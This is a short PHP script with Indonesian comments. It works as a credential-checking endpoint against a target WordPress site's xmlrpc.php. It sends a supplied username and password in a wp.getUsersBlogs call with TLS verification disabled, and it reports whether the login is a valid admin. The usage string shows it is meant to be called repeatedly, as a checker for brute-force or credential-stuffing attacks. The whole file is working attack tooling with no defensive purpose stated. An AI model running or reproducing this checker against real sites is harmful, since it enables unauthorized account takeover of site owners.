<?php
//26 Sep 2020
$link = 'https://nama_web.com'; //link target xmlrpc (Wordpress)

function curl_post($link,$post){
    $link = $link.'/xmlrpc.php';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $link);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
    curl_setopt($ch, CURLOPT_TIMEOUT, 2);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}
//

if(@trim($_GET['u']) != NULL AND @trim($_GET['p']) != NULL){
    $email = trim($_GET['u']);
    $password = trim($_GET['p']);
    $post = "<?xml version='1.0'?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>$email</value></param><param><value>$password</value></param></params></methodCall>";

    $curl = curl_post($link,$post);
    //echo "$curl<hr>";
    $kecilin = strtolower($curl);

    //cek hasil
    if(preg_match("/(forbiden|permission|404)/",$kecilin)){
        $hasil = "close"; //gabisa lanjut
    }else if(preg_match("/(faultcode|fault)/",$kecilin)){
        $hasil = "false"; //jika user atau pass salah
    }else if(preg_match("/admin/",$kecilin)){
        $hasil = "true"; //user dan pass betul
    }else{
        $hasil = "uncheck"; //server ga respon
    }
    echo "$hasil";
}else{
    echo "CARA PAKAI: api.php?u=USERNAME&p=PASSWORD";
}



?>
